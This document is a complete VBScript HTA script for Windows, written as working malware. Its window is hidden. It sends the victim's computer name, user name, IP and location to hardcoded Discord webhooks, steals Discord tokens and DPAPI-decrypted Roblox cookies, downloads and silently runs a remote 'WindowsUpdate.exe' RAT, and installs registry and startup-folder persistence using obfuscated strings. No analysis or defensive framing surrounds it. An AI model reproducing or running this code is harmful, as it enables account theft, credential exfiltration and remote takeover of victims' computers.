' language: VBScript/HTA, file: file.hta, target: Windows 10/11, mshta engine
<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0:window.moveTo -2000,-2000
On Error Resume Next

Dim sh, fso, WH, RE_WH, COOKIE_WH, PC, USER, ratDropped
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' --- WEBHOOKS ---
WH = "https://discord.com/api/webhooks/1573904916001456162/rxQeUCo6Rtg8_Xes7efwmybNHPHrl_WiOSWPwEEsqKb3PdbG2gsIQee8nR0plW5WV01F"
RE_WH = "https://discord.com/api/webhooks/1573905019235868795/1h-kB4PA8BOkVaMTWu4TU4Qd89AqPFtXkp9ipslf3GvhrUAjvmskSVfXA7KHJCDp0Lei"
COOKIE_WH = "https://canary.discord.com/api/webhooks/1573904916001456162/rxQeUCo6Rtg8_Xes7efwmybNHPHrl_WiOSWPwEEsqKb3PdbG2gsIQee8nR0plW5WV01F"

PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")
ratDropped = False

' --- 1. INITIAL GRABS ---
Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, WH)
Call IP(WH)
Call GrabTokens(WH)
Call Persistence
Call PostCookieOnly(COOKIE_WH)

' --- 2. DROP RAT LAST ---
Call DropRAT(WH, True)

' --- 3. LOOP ---
Dim runCount
runCount = 0
Do
    runCount = runCount + 1
    Call PostEmbedTo(":repeat: Re Grab " & runCount, "PC: " & PC, 10181046, RE_WH)
    Call GrabTokens(RE_WH)
    Call IP(RE_WH)
    Call PostCookieOnly(COOKIE_WH)
    
    If Not ratDropped Then
        Call DropRAT(RE_WH, True)
    End If
    
    Call SleepSeconds(30)
Loop

window.close()

' --- RAT DROP ---
Sub DropRAT(targetWH, sendRocket)
    Dim dl : dl = "https://cdn.discordapp.com/attachments/1351499996263878729/1573919433020412246/WindowsUpdate.exe?ex=6b03c232&is=6b0270b2&hm=4d3a346fca9a87136a99e8c7c10fb28b71f0366d22cbd745c2b665e1fe3093c4&"
    
    Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
    If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
    Randomize
    Dim fname : fname = "w" & Int(Rnd() * 900000 + 100000) & ".exe"
    Dim op : op = tPath & "\" & fname

    If fso.FileExists(op) Then fso.DeleteFile op, True

    Dim dlCmd : dlCmd = "cmd /c curl.exe -s -L -A ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"" -o """ & op & """ """ & dl & """"
    sh.Run dlCmd, 0, True

    If fso.FileExists(op) Then
        Dim fSize : fSize = fso.GetFile(op).Size
        If fSize > 100000 Then
            Dim fSizeMB : fSizeMB = Round(fSize / 1048576, 2)
            If sendRocket Then Call PostEmbedTo(":rocket: RAT Download", "Downloading: " & fSizeMB & " MB", 10181046, targetWH)
            Call RunCmd("""" & op & """")
            ratDropped = True
            If sendRocket Then 
                Call SleepSeconds(2)
                Call PostEmbedTo(":white_check_mark: RAT Launched", "Payload executed successfully.", 10181046, targetWH)
            End If
        End If
    Else
        If sendRocket Then Call PostEmbedTo(":rocket: RAT Download", "Failed to fetch payload.", 10181046, targetWH)
    End If
End Sub

' --- RunCmd ---
Sub RunCmd(cmd)
    Dim w,p,i,s
    Set w = GetObject("winmgmts:\\.\root\cimv2")
    Set s = w.Get("Win32_ProcessStartup").SpawnInstance_
    s.ShowWindow = 0
    Set p = w.Get("Win32_Process")
    p.Create cmd,,s,i
End Sub

' --- IP Function ---
Sub IP(targetWH)
    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", "https://api.ipify.org/", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ip : ip = xh.responseText
    If Len(ip) < 7 Then Exit Sub
    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ll : ll = Split(xh.responseText, vbLf)
    Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER
    Call PostEmbedTo(":dart: Target", info, 10181046, targetWH)
    Set xh = Nothing
End Sub

' --- GetRealIP ---
Function GetRealIP()
    GetRealIP = "Unknown"
    On Error Resume Next
    Dim h
    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "GET", "https://api.ipify.org", False
    h.Send
    If h.Status = 200 Then GetRealIP = h.ResponseText
    Set h = Nothing
End Function

' --- GetGeo ---
Function GetGeo(ip)
    GetGeo = "Unknown / Unknown"
    On Error Resume Next
    If ip = "Unknown" Then Exit Function
    Dim h, resp, country, city
    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "GET", "https://ipapi.co/" & ip & "/json/", False
    h.Send
    If h.Status = 200 Then
        resp = h.ResponseText
        Dim reg, matches
        Set reg = New RegExp
        reg.Pattern = """country_name""\s*:\s*""([^""]+)"""
        reg.Global = False
        Set matches = reg.Execute(resp)
        If matches.Count > 0 Then country = matches(0).SubMatches(0)
        reg.Pattern = """city""\s*:\s*""([^""]+)"""
        Set matches = reg.Execute(resp)
        If matches.Count > 0 Then city = matches(0).SubMatches(0)
        If Len(city) > 0 And Len(country) > 0 Then
            GetGeo = city & ", " & country
        ElseIf Len(country) > 0 Then
            GetGeo = country
        End If
    End If
    Set h = Nothing
End Function

' --- PostCookieOnly ---
Sub PostCookieOnly(targetWH)
    Dim ip, geo, ipInfo
    ip = GetRealIP()
    geo = GetGeo(ip)
    If geo = "Unknown / Unknown" Then
        ipInfo = ip
    Else
        ipInfo = ip & " / " & geo
    End If
    
    Dim paths(4)
    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
    Dim i, fp, raw
    For i = 0 To 4
        If fso.FileExists(paths(i)) Then fp = paths(i): Exit For
    Next
    If Len(fp) = 0 Then
        Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
        If fso.FolderExists(pk) Then
            Dim folder, subf
            Set folder = fso.GetFolder(pk)
            For Each subf In folder.SubFolders
                If InStr(subf.Name, "ROBLOX") > 0 Then
                    Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
                    If fso.FileExists(uwp) Then fp = uwp: Exit For
                End If
            Next
            Set folder = Nothing
        End If
    End If
    If Len(fp) = 0 Then
        Call PostEmbedTo("Roblox Logger - No Cookie", "IP: " & ipInfo & vbLf & "PC: " & PC & vbLf & "User: " & USER, 16711680, targetWH)
        Exit Sub
    End If
    raw = ReadFile(fp)
    If Len(raw) < 50 Then
        Call PostEmbedTo("Roblox Logger - File Too Small", "Size: " & Len(raw) & " bytes" & vbLf & "IP: " & ipInfo & vbLf & "PC: " & PC, 16711680, targetWH)
        Exit Sub
    End If
    
    Dim cookie: cookie = "": Dim approach: approach = ""
    If InStr(raw, "_|WARNING") > 0 Then cookie = raw: approach = "Plaintext"
    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
        approach = "JSON-DPAPI"
        Dim sp: sp = InStr(raw, "CookiesData"":""")
        If sp > 0 Then
            sp = sp + 14
            Dim ep: ep = InStr(sp, raw, """")
            If ep > sp Then
                Dim b64: b64 = Mid(raw, sp, ep - sp)
                If Len(b64) > 100 Then
                    cookie = DecryptDPAPI(b64)
                    If Len(cookie) = 0 Then cookie = b64: approach = "JSON-Raw"
                End If
            End If
        End If
    End If
    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then approach = "Raw-ROBLOSECURITY": Dim rp: rp = InStr(raw, ".ROBLOSECURITY"): cookie = Mid(raw, rp)
    If Len(cookie) = 0 Then cookie = raw: approach = "RawFile"
    
    Dim cae: cae = InStr(cookie, "|$CAE")
    If cae = 0 Then cae = InStr(cookie, "|_CAE")
    If cae > 0 Then cookie = Mid(cookie, cae)
    
    Dim embedDesc, cookieTrunc
    embedDesc = "Method: " & approach & vbLf & "Cookie Size: " & Len(cookie) & " bytes" & vbLf & vbLf & "IP Location: " & ipInfo & vbLf & "Computer: " & PC & vbLf & "User: " & USER
    
    If Len(cookie) > 1000 Then
        cookieTrunc = Left(cookie, 997) & "..."
    Else
        cookieTrunc = cookie
    End If
    
    Call PostEmbedWithCookie("Roblox Cookie Logger", embedDesc, cookieTrunc, 65280, targetWH)
End Sub

' --- PostEmbedWithCookie ---
Sub PostEmbedWithCookie(t, d, ck, col, targetWH)
    On Error Resume Next
    Dim j
    j = "{""embeds"":[{""title"":""" & Ej(t) & """,""description"":""" & Ej(d) & """,""color"":" & col & ",""fields"":[{""name"":""Cookie"",""value"":""```" & Ej(ck) & "```""}],""footer"":{""text"":""Logged: " & Ej(Now()) & """}}]}"
    Dim h
    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", targetWH, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
    Set h = Nothing
End Sub

' --- Sleep Functions ---
Sub SleepSeconds(s)
    Dim t0, t1, t2, elapsed
    t0 = Timer()
    Dim cmd : cmd = "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul"
    sh.Run cmd, 0, True
    elapsed = Timer() - t0
    If elapsed < 0 Then elapsed = elapsed + 86400
    If elapsed < s Then
        t1 = Timer()
        Do
            t2 = Timer()
            If t2 < t1 Then t2 = t2 + 86400
            If (t2 - t1) >= (s - elapsed) Then Exit Do
        Loop
    End If
End Sub

' --- Persistence ---
Sub Persistence()
    Dim payload : payload = "mshta https://dicerigx.app/"
    On Error Resume Next
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
    Dim sf : Set sf = fso.CreateTextFile(sp, True)
    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
    sf.Close
    Call PostEmbedTo(":pushpin: Persistence", "3 startup methods installed", 10181046, WH)
End Sub

' --- GrabTokens ---
Sub GrabTokens(targetWH)
    Dim psCode, psf, tf, raw
    psf = TmpFile("grab.ps1")
    tf = TmpFile("grab_results.txt")
    If fso.FileExists(tf) Then fso.DeleteFile tf, True

    psCode = "$out = '';" & vbCrLf & _
    "try {" & vbCrLf & _
    "  $lp = $env:LOCALAPPDATA + '\Discord';" & vbCrLf & _
    "  if (Test-Path $lp) {" & vbCrLf & _
    "    $tok = (Get-ChildItem -Path $lp -Recurse -Filter '*.ldb' | Select-String -Pattern '[\w-]{24}\.[\w-]{6}\.[\w-]{27}' | Select-Object -First 1).Matches.Value;" & vbCrLf & _
    "    if ($tok) { $out += 'DISCORD|Unknown|Unknown|Unknown|' + $tok + [Environment]::NewLine }" & vbCrLf & _
    "  }" & vbCrLf & _
    "} catch {}" & vbCrLf & _
    "Set-Content -Path '" & tf & "' -Value $out"

    WriteFile psf, psCode
    sh.Run "powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
    
    If fso.FileExists(tf) Then
        raw = ReadFile(tf)
        If Len(raw) > 10 Then
            Dim lines: lines = Split(raw, vbCrLf)
            Dim l
            For Each l In lines
                l = Trim(l)
                If InStr(l, "DISCORD|") = 1 Then
                    Dim p: p = Split(Mid(l, 9), "|")
                    If UBound(p) >= 4 Then
                        Dim info: info = "**User:** " & p(0) & vbCrLf
                        info = info & "**Token:** " & p(4)
                        Call PostEmbedTo(":gift: Discord Token", info, 10181046, targetWH)
                    End If
                End If
            Next
        End If
        fso.DeleteFile tf, True
    End If
    fso.DeleteFile psf, True
End Sub

' --- Utility Functions ---
Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function

' --- PostEmbed ---
Sub PostEmbed(t, d, c)
    Call PostEmbedTo(t, d, c, WH)
End Sub

Sub PostEmbedTo(t, d, c, target_wh)
    Dim DQ: DQ = Chr(34)
    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", target_wh, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
    Set h = Nothing
End Sub

' --- DecryptDPAPI ---
Function DecryptDPAPI(b64)
    DecryptDPAPI = ""
    Dim inf: inf = TmpFile("dpi.txt")
    Dim outf: outf = TmpFile("dpo.txt")
    fso.DeleteFile outf, True
    WriteFile inf, b64
    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
    Dim psf: psf = TmpFile("dpapi.ps1")
    WriteFile psf, ps
    sh.Run "powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
    If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
    fso.DeleteFile inf, True
    fso.DeleteFile psf, True
    fso.DeleteFile outf, True
End Function

' --- Ej ---
Function Ej(s)
    Ej = s
    Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
    Ej = Replace(Ej, Chr(34), Chr(92) & Chr(34))
    Ej = Replace(Ej, vbCrLf, Chr(92) & "n")
    Ej = Replace(Ej, vbCr, Chr(92) & "n")
    Ej = Replace(Ej, vbLf, Chr(92) & "n")
    Ej = Replace(Ej, vbTab, Chr(92) & "t")
End Function
</script>
</body></html>
